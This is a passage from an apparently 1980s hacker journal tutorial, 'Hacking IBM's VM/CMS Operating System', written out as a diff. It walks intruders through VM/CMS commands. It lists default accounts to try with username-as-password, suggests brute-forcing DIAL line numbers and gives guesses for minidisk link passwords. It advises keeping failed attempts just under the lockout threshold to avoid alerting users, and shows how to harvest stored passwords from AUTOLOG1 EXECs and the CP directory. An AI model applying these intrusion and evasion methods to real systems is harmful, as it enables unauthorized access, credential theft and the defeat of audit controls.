+number as the first character or a control character was used somewhere in the
+userid field.
+
+"Error in CP directory": The CP directory is the main user directory for the
+system. Entries in the directory contain: the userid and password, VM I/O
+configuration, disk usage values, associated virtual and real addresses,
+privilege classes, virtual processor size, and other options for each user.
+Without the proper directory entry, a user cannot logon to the system.
+Therefore receiving this error message.
+
+"Command not valid before logon": This occurs when you enter anything other
+than the commands listed in the menu, ie: entering BONEHEAD will return this
+message even though "BONEHEAD" isn't a valid command. Why this is I don't know.
+So don't get all excited that you found a valid command but couldn't execute it
+since you weren't logged on.
+
+
+Accounts:
+
+By constantly compiling userids from various systems you should be able to
+collect a nice list of accounts which may enable you to gain access to a
+system. The following are a few which I have found:
+
+OPERATOR
+CMSBATCH
+AUTOLOG1
+OPERATNS
+VMTEST
+VMUTIL
+MAINT
+SMART
+VTAM
+EREP
+RSCS
+CMS
+SNA
+
+As usual, use the username as the password. Things still haven't changed from
+the Hacking VAX/VMS series...people are just as stupid as they were a few years
+ago.
+
+There are many default accounts which have the passwords listed in some IBM
+system manuals. These are hard to obtain and are very powerful since some
+passwords are rarely changed. If you can get access to the defaults, it will
+greatly expand your collection of systems, I guarantee it.
+
+
+Dial:
+
+DIAL is used to logically connect lines, whether they be switched (regular
+dial-up phone lines), leased (dedicated), or logically attached (directly
+connected), to a previously logged on multiple-access system. The DIAL command
+is the only substitute for the logon command. On systems running more than one
+Operating System, DIAL is used to connect the user to one of those systems.
+It is rather common to find two or more Operating Systems running parallel or
+"under" one another. This is quite different from most other systems, which run
+alone on the machine. One machine, one Operating System, but not IBM. The
+ability to have multiple systems running simultaneously and still providing the
+user with the illusion of it being a single system, (ie: the whole idea behind
+multi-tasking machines is to provide each user with the full resources of the
+machine so quickly that it appears that he or she is the only one using the
+system) sets IBM apart from most other computer manufacturers. Some of the
+systems which run on IBM's are: VM/CMS, MVS/TSO, DOS/VSE, OS/VS1. Some others
+are: MUSIC, JES and IX/370 which is IBM's version of UNIX which runs under
+VM/SP.
+
+It is always good to know what other systems are running, and if you are unable
+to gain access to the 'primary' system, you may be able to gain access to one
+of the 'secondary' system(s) by use of DIAL. Some systems will require you to
+specify a line number for certain systems. Others will find a line for you if
+one is not specified, assuming there are some allocated to that resource.
+Userid's are also dialable. In some cases you have to dial through a particular
+userid in order to gain access to certain systems or perform certain commands.
+A typical logon to a DIALed system may look like:
+
+.DIAL MUSICB
+
+DIALED TO MUSICB   040
+
+*Miscellaneous Computer Services MUSIC/SP 1.1  SIGN ON.
+
+.RESET
+
+DROP FROM MUSICB   040
+
+VM/370
+!
+
+.
+
+When it comes to finding a valid line number for systems that can be reached
+via DIAL, you could be in for some trouble. If the system requires a line
+number to be entered (unlike the above example, where line 040 was found
+automatically) you will not only have to come up with a defined line number,
+but one that is associated with the system you are attempting to access.
+Usually you can find this information after logging on to the VM/CMS system in
+various files, but if you cannot get in, you will have to sequentially enter
+line numbers. Some that I have seen are 001, 01B, 41A, 040.
+
+The VM/CMS system does not appear to limit the number of DIAL attempts a user
+can make, unlike LOGON attempts. Programming your micro to search for a valid
+line number to a system should work with no problem.
+
+To drop the dialed connection just type RESET.
+
+Error Messages:
+
+"Line(s) not available on 'sysname'.": Either there are no lines allocated to
+the system, or you must enter a correct line number.
+
+"Invalid device type - 'sysname' 'line#': You have entered a valid system or
+userid and line number, but the device you are on (the terminal) is invalid. In
+this case, a GRAF (Graphics) device, system console or 3270 terminal may be the
+only valid device.
+
+"'userid' not logged on": The DIAL command cannot be executed unless the user
+(or system) specified is logged on.
+
+"'line#' does not exist": A valid userid/system has been entered but the line
+number for that userid/system is not valid.
+
+
+Message:
+
+MSG is used to send messages to users who are currently logged on. This command
+can be issued before (if specified by the logon menu) and after logging in.
+
+MSG OPERATOR Help! I lost my password! My userid is COMOSOLO
+
+This will send a message to the primary system operator of the system. If there
+is only one CLASS A user online, the message will be sent to his terminal.
+
+MSG *
+
+This will send a message to yourself. This is useful for identifying the
+current userid of an abandoned terminal.
+
+
+Logoff:
+
+The LOGOFF command can be abbreviated as LOG. After logging off you will
+receive the following:
+
+CONNECT= 00:33:54 VIRTCPU= 000:00.28 TOTCPU= 000:01.76
+LOGOFF AT 17:05:44 EST THURSDAY 04/16/87
+
+CONNECT is the actual clock time you spent while on the system.
+VIRTCPU is the virtual CPU time that was used.
+TOTCPU  is the total CPU time both virtual and overhead that was used.
+
+
+The HOLD command will hold the connection allowing you to re-logon again
+without having to re-dial the system.
+
+.LOG HOLD
+
+
+SECURITY SOFTWARE:
+------------------
+
+There are various weaknesses within VM/CMS both internally and externally which
+can be exploited. For this reason, various software security packages have been
+written. There would not be a need for these in most cases if the people in
+charge of system security knew what they were doing. Anyhow, these packages do
+provide added security when properly implemented. The most commonly found are
+VMSECURE and ACF2. TOP SECRET and RACF are others which are less common. These
+packages are easily identified.
+
+After entering a valid userid VMSECURE responds with:
+
+VMXACI104R Enter logon password:
+ **************************
+ HHHHHHHHHHHHHHHHHHHHHHHHHH
+ SSSSSSSSSSSSSSSSSSSSSSSSSS
+.
+
+
+One way to positively identify the use of VMSECURE is by using it as a userid.
+If it is running it will be a valid userid, and who knows, you may even hack
+the password.
+
+
+After entering a bad password ACF2 (Access Control Faclity 2) responds with:
+
+ACFV1012  PASSWORD NOT MATCHED
+ACFV0044  ACF2, ENTER PASSWORD
+
+ **************************
+ HHHHHHHHHHHHHHHHHHHHHHHHHH
+ SSSSSSSSSSSSSSSSSSSSSSSSSS
+.
+
+These packages provide information which SHOULD be inherent within the
+Operating System itself. Perhaps newer versions of CMS will contain them. Some
+of these features are:
+
+* Last logon date/time
+* Password expiration
+* Rules for password selection
+* Invalidating userids for invalid password attempts
+* Invalidating terminals for invalid password attempts
+* Shows users how many invalid password attempts have occured on their userid
+* Increased file security
+
+
+LOGGED ON:
+----------
+
+After logging on you may receive something similar to the following:
+
+ASD 190 LINKED R/O; R/W BY MAINT; R/O BY 030 USERS
+
+LOGMSG - 10:40:25 EST FRIDAY 05/22/87
+
+*********************************************************************
+*            WELCOME TO MISCELLANEOUS COMPUTER SERVICES             *
+*                              -VM1-                                *
+* SYSTEM WILL BE DOWN FROM 10:00 TO 10:30 EST SUNDAY MAY 24, 1987   *
+*********************************************************************
+Logon at 13:22:59 EST FRIDAY 05/22/87
+VM/SP REL 4 04/20/86 11:33
+
+R; T=0.01/0.01 13:23:10
+.
+
+Line #1:  This line shows that the disk at virtual address 190 is linked with
+          R/O access by you, R/W by userid MAINT and R/O by another 30 users.
+
+Line #2:  This shows that the logon message was created at 10:40 on Friday.
+
+Line #3-7:This is the message that is shown to all users of the system upon
+          logging on. Some systems may not have one.
+
+Line #8:  The actual time of logon is printed.
+
+Line #9:  The current RELEASE of VM/SP and the time and date it was installed
+          is shown.
+
+Line #10: This is the ready message and it is printed after every command is
+          performed where:
+
+R= Ready  This indicates that the system is ready for input.
+T= Time   The first series of numbers tells how long it took the system to
+          perform the last task. The second set of numbers gives the time of
+          day.
+
+
+          If you do not receive the ready message you are in CP and must IPL
+          CMS in order to issue CMS commands.
+
+Line #11: The system prompt, you can now enter commands.
+
+
+PRIVILEGE CLASSES:
+------------------
+
+As with most other Operating Systems a user must have sufficient privileges in
+order to execute certain commands. Every CP command belongs to one of eight IBM
+defined privilege classes. The CP directory defines which users can use which
+classes of commands. Each user has one or more privilege classes, as does each
+CP command. If you try to issue a command that does not match the assigned
+privilege class of the userid you are using, the system will not process the
+command. As far as I know, no records of attempts to use privileged commands
+are kept.
+
+
+Class          User and Function
+---------------------------------
+  A            Primary System Operator: The class A user has the ability to
+               control the system. Any user who uses the VM/SP system console
+               posseses this privilege class. This user can broadcast messages,
+               control system accounting, and issue commands which affect the
+               overall performance of the system.
+
+  B            System Resource Operator: The class B user has the ability to
+               control all the "real" resources of the system, except those
+               controlled by the spooling and primary system operators.
+
+  C            System Programmer: Class C users can modify real storage as
+               opposed to virtual storage.
+
+  D            Spooling Operator: The class D user controls spooling data
+               files.
+
+  E            System Analyst: Monitors and interprets system performance data.
+
+  F            Service Representative: This class is usually given to accounts
+               that IBM Field Service personnel use for updates and also for
+               diagnosing system problems.
+
+  G            General User:  Class G users are the most prominent on the
+               system. This privilege allows the user to control functions
+               associated with their own virtual machine.
+
+  Any          The Any classification is given to certain CP commands which are
+               available to any user. The commands are usually limited to Login
+               and Logoff.
+
+  H            Class H is reserved for IBM use.
+
+
+Due to the individual needs of a site, privilege classes can be tailored to
+suit the facility.  A total of up to 32 classes can be made. They would be
+shown in the CP directory as A-Z and 1-6.
+
+Typical Privilege Classes for a few common userids:
+
+Userid:    P.C.
+-------------------------
+OPERATOR   A
+EREP       F
+OPERATNS   BCEG
+MAINT      ABCDEFG
+
+
+
+COMMANDS:
+---------
+
+Commands are made up of command names, operands, and options.
+
+Command Name: A command name is an alphanumeric symbol of up to 8 characters.
+
+Operands: These specify the information on which the system operates when it
+performs a command function.
+
+Options: These keywords are used to control the execution of a command. When
+used, they must be preceded by a left parentheses, but a closing one is not
+necessary.
+
+Different commands are used within different environments. To see which
+environment you are in, simply hit return at the period prompt. You will
+receive one of the following: CMS, CP, XEDIT.
+
+There are many commands that are useful to both regular system users and
+hackers. HELP is available on some systems, particularly on university systems.
+It is extensive but not as clear as yes, UNIX or VMS which is typical of IBM.
+Nevertheless, HELP is useful and you should get hardcopies of as many commands
+as you can. AID is another form of HELP which may be useful to you in learning
+more about the system.
+
+One nice feature of CMS HELP is that when you receive an error message, you
+can:
+
+.HELP DMS000000 or DMK000000
+
+Where DMS000000 or DMK000000 is the error message you have received. The system
+will then explain what it is, why it happened and how you can correct it.
+
+I am going to hold off on explaining any and all commands related to minidisks
+until the next section. The others which I have found to be useful are as
+follows.
+
+You can issue any CP command while in CMS by precluding the command with CP.
+
+
+QUERY
+
+Query allows you to obtain various information about the system. A full list
+can be found from using HELP.
+
+One of the most important QUERY commands to the hacker is:
+
+.Q NAMES
+
+OPERATOR - 01F, SMART    - DSC, CMS0349  - B27, LOGO0180 - B31
+VSM - VMVS1
+SCOTT   -TP11WFM2, CMS1211 -TP11WF64, OPERATNS-TP11WFY1
+R; T-0.01/0.01 11:34:28
+
+There can be many users online, usually this list will contain from 30 to 100
+users. The last user online was OPERATNS, since it was last in the list. The
+SMART userid is DSC, or in a disconnected state. Usually a terminal will
+remain disconnected for 15 to 30 minutes and then is totally logged off the
+system. If you logon to an already disconnected terminal, the system will reply
+with "RECONNECTED AT time". The other 2 userids on the same line as SMART are
+probably connected terminals which are in a pre-logged in or pending logon
+state. VSM - VMVS1 is another system running parallel to (or under) CMS.
+
+The QUERY NAMES command allows you to gain a little more security for yourself
+on the system. It allows you to gain more valid usernames to attempt passwords
+for in the unfortunate event that your current userid dies. Another use is that
+you can start to compile your "common accounts" list of userids which are found
+on VM/CMS systems. This list should get larger and larger as you gain access to
+more and more systems and will allow you to gain access to more systems as it
+gets larger.
+
+
+If you can't count how many users are online from the Q NAMES list:
+
+.Q USERS
+
+0007 USERS, 0000 DIALED, 0000 NET
+
+
+If you didn't catch the logon message you can view it again by:
+
+.Q LOGMSG
+
+
+To see what release of CMS the system is:
+
+.Q CMSLEVEL
+
+VM/SP REL. 4, SERVICE LEVEL 417
+
+If you are wondering which IBM mainframe CMS is running on, you can issue:
+
+.Q CPUID
+FF01472343810000
+
+This can be interpreted as follows:
+
+CPUID= aabbbbbbccccdddd
+
+aa= "FF" when running VM/SP
+bbbbbb= The processor ID number
+cccc= The model number of the system. In the above case, CMS is running on
+      an IBM 4381 system.
+dddd= "0000" This is not used for CP.
+
+
+SENDFILE allows you to send files within any minidisk that is currently
+accessed by you to another user. Anytime you send a file an entry is made in
+the file USERID NETLOG (where USERID is the user you are sending the file to).
+This command is also used for sending NOTE files which can be created with an
+editor and send to whomever as E-MAIL.
+
+If you are tired of seeing a text listing, or have attempted to read a compiled
+program and wish to exit or break out of it, simply hit a hard-break, and then
+type HX. HX is for Halt eXecution. It will halt whatever you are doing and put
+you back into the CMS environment. It may take a few lines of text after
+entering it for the system to stop the process.
+
+
+
+                             --- End of Part A ---
+                          --- Attach Part B here ---
+
+The LOD/H Technical Journal: File #9 of 10
+
+
+                     Hacking IBM's VM/CMS Operating System
+                                     PART B
+
+Command Interpretation Chart: The following chart will compare the commands
+used on VAX/VMS, UNIX, and VM/CMS to allow those who are familiar with the
+other Operating Systems to quickly reference its CMS counterpart.
+
++-----------------+---------------+----------------------+--------------------+
+! VAX/VMS         ! UNIX          ! VM/CMS               ! SHORT EXPLANATION  !
++-----------------+---------------+----------------------+--------------------+
+! /NOCOMMAND      ! *****NONE**** ! NOIPL                ! aborts login pgm   !
++-----------------+---------------+----------------------+--------------------+
+! SHOW USERS      ! WHO           ! QUERY NAMES          ! online userlisting !
++-----------------+---------------+----------------------+--------------------+
+! DIRECTORY       ! LS            ! LISTFILE or FILELIST ! show current dir.  !
++-----------------+---------------+----------------------+--------------------+
+! TYPE filename   ! CAT filename  ! TYPE fname ftype fm  ! list or view files !
++-----------------+---------------+----------------------+--------------------+
+! EDIT            ! ED or VI or EX! XEDIT                ! system editor      !
++-----------------+---------------+----------------------+--------------------+
+! DELETE filename ! REMOVE filenme! ERASE fname ftype fm ! deletes files      !
++-----------------+---------------+----------------------+--------------------+
+! PHONE username  ! WRITE user    ! TELL userid          ! user communication !
++-----------------+---------------+----------------------+--------------------+
+! Control-Y       ! Ctrl-Backslash! Hard-break then HX   ! aborts process     !
++-----------------+---------------+----------------------+--------------------+
+
+Corresponding files:
+
++-----------------+---------------+--------------+----------------------------+
+! SYSUAF.DAT      ! /ETC/PASSWD   ! USER DIRECT  ! Userlist & user information!
+! MAIL.TXT        ! USR/MAIL/user ! USERID NOTE  ! Electronic mail files      !
+! LOGIN.COM       ! .PROFILE      ! PROFILE EXEC ! User login command files   !
++---------------------------------+--------------+----------------------------+
+
+
+Local Commands:
+---------------
+
+Local commands are commands written for an individual system. They are
+customized commands that suit a facilities' needs. These commands are execs
+which are either not available from IBM or are cheaper to write on their
+own. I will mention a few which may be found on other systems, as these are
+rather common.
+
+WHOIS
+
+This command gives a little information about the users that you specify which
+are on the system.
+
+.WHOIS MAINT BACKUP MAILER BUBBA RELAY VMUTIL
+
+Userid    Name
+--------- ---------
+MAINT     System Maintenance Account
+BACKUP    VM System Backup and Recovery Machine
+MAILER    BITNET Inter-Node Mail Processing Machine
+BUBBA     Bubba B. Bonehead - Programmer/Analyst Extroadinaire
+RELAY     BITNET Internet Chat Facility
+VMUTIL    VM Utilization Statistics
+
+
+
+SYSPASS
+READPW
+WRITEPW
+
+In most cases, the only way to change a users' password is by having the system
+operator or someone with high privileges do it. This is one reason why many
+passwords remain the same for long periods of time. These programs allow users
+to change their logon password, read access minidisk password and write access
+minidisk password respectively. Perhaps you will find these or similar programs
+on some systems.
+
+
+Privileged Commands:
+--------------------
+
+As far as I know, there is no command to determine which privilege class the
+userid you are abusing is. The only way is to check in the CP Directory for it.
+The following are some privileged commands and what privilege class is needed
+to run them. Again, as far as I know, the system keeps no records of failed
+attempts at running privileged commands. Use of these commands are most likely
+recorded, has a msg sent to the system console or both, especially when using
+FORCE.
+
+
+FORCE userid (Class A)
+
+This command will forcibly log off the userid you specify. I really can see
+no reason other than to be a total asshole for abusing this command.
+
+DISABLE raddr (or) all  (Class A or B)
+
+This is used to prevent specific terminals or all terminals from logging onto
+the system. Again, there is no real reason to use this or most other privileged
+commands for that matter unless you want to be kicked off of the machine. If
+you do DISABLE a terminal, simply use ENABLE to repair the damage.
+
+DETACH realaddr (FROM) whatever (Class B)
+
+This is used to detach real devices from the system. These can be terminals,
+printers, disk packs, tape drives, etc. You must know the real address of the
+device, and 'whatever' can be the system, or a userid.
+
+WARNING userid (or) operator or all (Class A or B)
+
+Warning will send a priority message to a user, operator or all users on the
+system. It will interrupt anything they happen to be doing. Obviously sending
+a msg to all users stating they are BONEHEADS is not recommended.
+
+
+MINIDISKS:
+----------
+
+A minidisk is a subdivision of consecutive cylinders on a real DASD volume. The
+real DASD device, is the actual disk the information is stored on. This can be
+compared to a hard drive for an IBM PC. Before the drive can be used, it must
+be formatted. Once formatted, it is divided up into directories which are
+minidisks. Each minidisk is a number of cylinders which is the standard memory
+storage unit. There can be many minidisks on a DASD.  Associated with each CMS
+disk, is a file directory, which contains an entry for every CMS file on the
+disk.  A minidisk can be defined for R/W or R/O access. It can also be used for
+temporary or permanant storage of files. Each minidisk has a virtual address.
+Virtual addresses can be from 001-5FF (hexidecimal) in basic control mode, and
+001-FFF in ECMODE (Extended Control Mode).
+
+CMS minidisks can be accessed according to a letter of the alphabet (A-Z).  In
+order to better explain this, lets assume we are logged onto a VM/CMS system
+under the userid of JOE and we want to see what minidisks we have access to.
+We use the QUERY SEARCH command to determine which disks we are ATTACHed to.
+
+.Q SEARCH
+
+JOE001  191  A    R/W
+JOE002  192  D    R/O
+CMS190  190  S    R/O
+CMS19E  19E  Y/S  R/O
+
+
+As can be seen each minidisk has a volume name, virtual address, filemode,
+and access mode. The A disk is the default. Most accounts you gain access with
+will have an A disk with a virtual address of 191. The S disk is the System
+disk. This contains the files and programs for running the system. The same
+goes for the Y disk. The D disk is another disk used by JOE.
+
+You can view what each of these directories contains by issueing the LISTFILE
+command.
+
+.LISTF
+
+BUBBA    NOTE     A1
+MISC     WHATEVER A1
+PROFILE  EXEC     A0
+
+
+This is a list of files on the A disk. The first column is the Filename the
+second is the Filetype and the third is the filemode. Filenames can be anything
+you specify. Filetypes can also be anything you specify, but commonly follow a
+pattern which tells what type of file it is. Filemodes are comprised of a
+filemode letter (A-Z) and a filemode number (0-6).
+
+Filenames can contain the following characters: A-Z  0-9  $  #  +  -  :  `  U
+
+Here is an explanation of common filetypes:
+
+Filetype ! Description
+---------+-------------
+DATA     ! Data for programs or simply TYPE-able text.
+EXEC     ! User written programs or IBM procedures written in REXX.
+HELP     ! System HELP files.
+HELPCMS  ! System HELP files.
+LANGUAGE ! One of the langauges that the system supports, such as ASSEMBLE,
+         ! COBOL, FORTRAN, JCL, REXX, PL1, SNOBALL, BINARY, ETC.
+LISTING  ! Program source code listings
+LOADLIB  ! Loading Library
+MACLIB   ! Macro Library
+MODULE   ! System commands
+NETLOG   ! Contains a list of all files which have been SENT to other users.
+NOTE     ! Similar to E-MAIL on other systems, a note sent from another user.
+SOURCE   ! SOURCE code for various programs.
+TEXT     ! Text file. Probably used for programs and when TYPEd yields little.
+TXTLIB   ! Text Library
+WHATEVER ! A nonstandard filetype which will probably be somewhat descriptive
+         ! of its contents.
+XEDIT    ! A file which was created using the XEDIT utility.
+
+
+Both filenames and filetypes must not exceed 8 characters in length.
+
+
+Filemodes:
+
+Filemode numbers are classified as follows:
+
+Filemode 0   There is little file security on VM/CMS.  This may be due to the
+             fact that directory security is very good.  A file with a mode of
+             zero makes that file invisible to other users unless they have
+             Read/Write access to that disk.  When you LINK to someones' disk
+             in Read/Only mode and get a directory listing, files with a mode
+             of 0 will not be listed.
+
+Filemode 1   This is the default filemode.  When reading or writing files, you
+             do not have to specify a filemode letter of 1 (unless you want
+             to) since it will default to it.
+
+Filemode 2   This is basically the same as a filemode of 1.  It is mainly
+             assigned to files which are shared by users who link to a common
+             disk, like the system disk.
+
+Filemode 3   Be careful when you see these!  These are erased after they have
+             been read.  If a file with a mode of 3 is printed or read it will
+             be erased.  Blindly reading files without paying attention to
+             the filemode numbers can shorten your stay on the system.  The
+             main reason for this filemode is for the files or programs which
+             are unimportant or have one time use can be automatically deleted
+             to keep disk space and maintenance to a minimum.
+
+Filemode 4   This is used for files that are to simulate OS data sets. They are
+             created by OS macros in programs running in CMS.  I have not found
+             any files with this filemode, so for the time being, you should
+             not be concerned about it.
+
+Filemode 5   This is basically the same as filemode 1.  It is different in that
+             its used for groups of files or programs.  It makes it easier for
+             deleting files a user wants to keep for a certain period of time.
+             You could just enter:
+
+             ERASE * * A5
+
+             Now all files on the A disk with a filemode of 5 will be deleted.
+
+Filemode 6   Files with this mode are re-written back to disk in the same place
+             which is called "update-in-place".  I have no idea why this would
+             be specified, and have not found any files with a filemode of 6.
+
+
+Filemode 7-9 These are reserved for IBM use.
+
+
+
+Look back to our Q Search listing. If you want to see what is on the D disk:
+
+.LISTF * * D
+
+NOTMUCH ONHERE D1
+
+In this case, the D disk only contains 1 file called NOTMUCH with a filetype of
+ONHERE. But do not forget the fact that you only have Read/Only access to the
+D minidisk! So there may or maynot be merely 1 file on the D disk. Remember all
+filemodes of 0 (which in this case would be D0) are invisible to anyone who
+does not posses Read/Write access.
+
+You can access any disk that you are ATTACHed to by replacing the D in the
+above example with the filemode letter (A-Z) you want to access. As was shown
+previously, the QUERY SEARCH command will give you a list of minidisks that
+your userid is attached to upon logging in. These command statements are
+usually found in your PROFILE EXEC.
+
+
+So you can access a few minidisks. There may be hundreds on the system. Unlike
+UNIX and VMS, and most other Operating Systems for that matter you cannot issue
+a command and some wildcard characters to view the contents of every users'
+directory. In order to access another users' directory (minidisk) you must have
+the following:
+
+1) The USERID of the person whose disk you wish to access.
+
+2) The virtual address(es) (CUU) that the USERID owns.
+
+3) The Read, Write, or Multi disk access password, depending on which
+   access mode you wish to use.
+
+This would be accomplished by the following:
+
+
+.LINK TO BUBBA 191 AS 555 RR
+
+Enter READ link password:
+ *************************
+ HHHHHHHHHHHHHHHHHHHHHHHHH
+ SSSSSSSSSSSSSSSSSSSSSSSSS
+.RBUBBA
+
+R; T=0.01/0.01 21:58:48
+.ACCESS 555 B
+
+R; T=0.01/0.01 21:59:03
+.Q SEARCH
+
+JOE001  191  A    R/W
+BUB001  555  B    R/O
+JOE002  192  D    R/O
+CMS190  190  S    R/O
+CMS19E  19E  Y/S  R/O
+
+.LISTF * * B
+
+MISCFILE DATA     B1
+PROFILE  EXEC     B1
+
+.REL 555
+
+R; T=0.01/0.01 22:02:01
+
+Now an explanation for the events which have just occured.
+
+The LINK command is used to access other users' minidisks. The format is:
+
+.LINK (TO) USERID VADDR1 (AS) VADDR2 (MODE) ((PASS=)PASSWORD)
+
+BUBBA is the USERID whose disk we wish to access.
+
+VADDR1 is a virtual address which belongs to the BUBBA userid. If BUBBA was to
+access our minidisk whose userid is JOE, he could access either our 191 address
+or our 192 address. The 190 and 19E addresses are usually automatically
+accessed by nearly all the users of the system since it contains system
+commands. We are assuming that BUBBA indeed has a minidisk with the virtual
+address of 191. Some userid's may not have any or they may have addresses which
+are somewhat obscure, say of 13A or 503. The only way we would be able to
+access those assuming BUBBA did not give them to us would be to guess them.
+This would be rather difficult, timeconsuming, and dangerous as we will soon
+see.
+
+VADDR2 is any address which is not currently in our control, (ie. in our Q
+Search which would be 190, 191, 192, 19E) and is in the range of 001 to 5FF in
+Basic Control or FFF in Extended Control. In this example, we chose to use 555.
+We could have easily used 104, 33F, 5FA, etc.
+
+MODE is the access mode which consists of up to 2 letters. The first letter
+specifies the Primary access mode. The second letter is optional and designates
+the alternate access mode. If the primary mode is not available, the alternate
+is used.
+
+The access mode we used was RR. Valid access modes are:
+
+R   Primary Read/Only access. This is the default. You can opt to not specify
+    an access mode when linking to a users' disk, and this is the mode which is
+    used. It will only work if no other links are in effect.
+
+RR  This allows read access no matter what links are in effect to that users'
+    disk.
+
+W   Primary Write access. This is only good if no other links are in effect.
+
+WR  If Write is available then the link will be made, if not it will goto Read.
+
+M   Primary Multiple access.
+
+MR  Resorts to Read if Multi is unavailabe.
+
+MW  This garauntees write access no matter what.
+
+
+If another user has write access to one of your disks when you log on, your
+access will be forced to Read/Only. For this reason, you should have read
+access to others disks instead of write. If you wish to see what files have a
+filemode of zero, then link with write access, view or access those files, then
+RELEASE the disk and re-access it via read to avoid suspicion by that user of
+unauthorized individuals gaining write access to his files.
+
+If a user has write access to a disk, you cannot gain write access unless you
+use a mode of MW. It is not recommended to have write access to anothers' disk
+if they themselves have write access. CMS cannot guarantee the integrity of
+the data on a disk which has more than one person linked to it with write
+access. Now if you see that the user is in a disconneced (DSC) state through
+the Q NAMES command, then it shouldn't be a problem if you have write access
+also since the person is not active. If that person re-connects however, then
+it is advisable to RELEASE that disk as soon as possible to avoid any chance of
+data being destoyed.
+
+PASS=PASSWORD  like the logon password, it can be a 1-8 character string that
+MUST match the access mode password for the VADDR1 of the userid which you are
+attempting to gain access to. Up to three access mode passwords can exist for
+each minidisk, R, W, and M.
+
+If the installation uses the Password Suppression Facility, an INVALID FORMAT
+message will be issued when you attempt to enter the password for a disk on the
+same line as the LINK command was entered on. Obviously this is to prevent
+people from 'spoofing' the password off the screen or from printouts found in
+the trash. If this occurs, just hit return after entering the access mode, and
+wait for the enter password response.
+
+Every disk password along with every users password and other information is
+contained in the CP Directory. If the password is "ALL" then a password is not
+required for any user so you will not be asked for one. You will then recieve
+a ready message indicating that the transaction has just been completed.
+
+If you receive the message: "BUBBA 191 NOT LINKED; NO READ PASSWORD" then
+within the CP Directory, there is no read password at all. This means that the
+only way you can gain access to BUBBA's directory would be by getting his logon
+password. One note, I believe that a users logon password cannot be any of his
+access mode passwords. The reasons for this are obvious. If BUBBA wants JOE to
+access a disk, then he can give JOE the corresponding disk password. If this
+was identical to his logon password then JOE could logon as BUBBA and access
+all BUBBA's disks with no problem, and at the same time posses all the privs
+that BUBBA has. Within the CP directory, if there is no password entry for read
+access then there are no entries for write nor multi. If there is no entry for
+write then there may or may not be an entry for read, but definitly not one for
+multi. And finally if there is no entry for multi then there may or may not be
+entries for read and write.
+
+The methods for obtaining disk access passwords are the same as anything else.
+Common sense and "Password Psychology" come into account along with the element
+of luck.
+
+Assume the userid is VMTEST and you are hacking the READ password. Passwords
+may be: RVMTEST, RVM, RTEST, RTESTVM. Others may be READ, READVM, VMREAD,
+READTEST, TESTREAD and even VMTEST. Of course it could be something like: J2*Z5
+Many times the same password will be used for R, W, and M access instead of
+three separate passwords.
+
+CP keeps track of unsuccessful LINK attempts due to invalid passwords. When you
+exceed the maximum number of incorrect password attempts, which usually
+defaults to 10, the link command will be disabled for the remainder of your
+stay on the system. All you have to do is re-logon and you will have full use
+of LINK again.
+
+If the LOGON/AUTOLOG/LINK journaling facility is activated, unsuccessful link
+attempts due to the above are recorded. When the threshold is reached the
+userid whose password you are trying to hack is sent a message. Therefore, keep
+track of the number of attempts you make and keep just short of the system
+threshold.
+
+After successfully linking to a users' disk, you must issue the ACCESS command
+in order to get a directory listing or access any files on that disk. This is
+accomplished by:
+
+.ACCESS VADDR2 B
+
+VADDR2 is the address after 'AS' in your link command line, and 'B' is the
+filemode letter which you wish to access the disk as. This can be anything but
+the letters which you have already assigned up to a total of 26 (A-Z).
+
+After accessing the disk to your hearts content, you can then RELEASE it. When
+you logoff the disk is automatically released. Releasing the disk is not
+necessary unless you already are attached to 26 minidisks, and you want to
+access more. You would then release whatever disks you wish and link then
+access others. After releasing disks, and you want to re-access that disk, you
+do not have to issue another link command but merely the ACCess command and
+what filemode you wish it to be.
+
+The QUERY DASD command will list the minidisks that most everyone on the system
+has access to. All of these may or maynot be automatically accessed upon logon.
+For this reason, you should issue it, then all you have to do is ACCess the
+virtual address and define the filemode.
+
+.Q DASD
+
+DASD  190  3380  SYSRES  R/O   32 CYL
+DASD  191  3380  SYSRES  R/W    1 CYL
+DASD  192  3380  SYSRES  R/O    2 CYL
+DASD  193  3380  SYSRES  R/O   19 CYL
+DASD  194  3380  SYSRES  R/O   21 CYL
+DASD  19E  3380  SYSRES  R/O   27 CYL
+
+In our Q SEARCH list, we have access to 190 as the system disk, 191 as our A
+disk, 192 as our D disk, 19E as the systems' Y disk. Both 193 and 194 are
+accessable but have not been accessed by us. Thus:
+
+.ACC 193 B
+B (193) R/O
+.
+
+Now the 193 disk is our B disk and accessable by us. You can perform the same
+procedure for the 194 disk.
+
+
+DIRMAINT:
+---------
+
+The Directory Maintenance utility can be found on some systems. If it is
+running, DIRMAINT should be a valid userid. The DIRMAINT userid is
+automatically initialized when the system is started up. It remains in
+Disconnected mode awaiting transactions which contain directory maintenance
+commands.
+
+
+If you come across a system with DIRMAINT, it will provide you with all the
+information you need to know about it. A few commands are important, at least
+to the hacker:
+
+MDPW  This displays access passwords for one or all of that userid's minidisks.
+
+.DIRM MDPW
+DVHDIR005R ENTER CURRENT CP PASSWORD TO VALIDATE COMMAND OR A NULL TO EXIT:
+R; T=0.12/0.15 19:33:34
+ DVHMDF301I MINIDISK 191: RBUBBA     WBUBBA    MBUBBA
+ DVHMDF301I MINIDISK 192: RBUBPW     BONEHEAD  MULTIBUB
+
+The reason you must enter the users logon password is obvious. If someone walks
+up to a users terminal and wants to know what the guys disk passwords are all
+he would have to do is enter this command and would get them, except for the
+fact that it does ask for the users logon password, thus, protecting the disk
+passwords.
+
+Help   Get more info on DIRM commands.
+PW     This changes a users logon password
+PW?    Find out how long it was since the user changed his logon password.
+MDISK  Change access mode, change, add, or delete passwords.
+LINK   Cause an automatic link, at logon, to another users minidisk.
+FOR    Enter a DIRMaint command for another user if authorized.
+
+
+THINGS YOU WANT:
+----------------
+
+Things you want are: More valid userid's to try passwords on, actual logon
+passwords, and disk access passwords. Obtaining userid's can be accomplished by
+using the Q NAMES command every time you logon. Obtaining logon passwords isn't
+as simple. There are a couple of places which you will want to explore.
+
+The AUTOLOG1 or AUTOOP virtual machines (userid's) usually auto-logon other
+userid's. Now, in order to do this they must have those users' passwords. These
+are contained within various EXECs within their user directory. If you can
+obtain a valid disk access password for whichever one of these is running on
+your particular system, you can get more passwords and possibly some disk
+access passwords for about 10 other userid's. This should allow you to get more
+disk access passwords and hopefully more logon passwords. Nevertheless, having
+obtained a few more passwords, and not using them until the original one you
+hacked dies, will greatly extend your stay on the system.
+
+EXEC files from any user may contain more disk access passwords for other users
+and those users directories may contain EXECs which have more passwords, and
+so on. Of course many other types of files may contain this type of
+information.
+
+The CP directory, this is similar to a big bullseye on a target. This
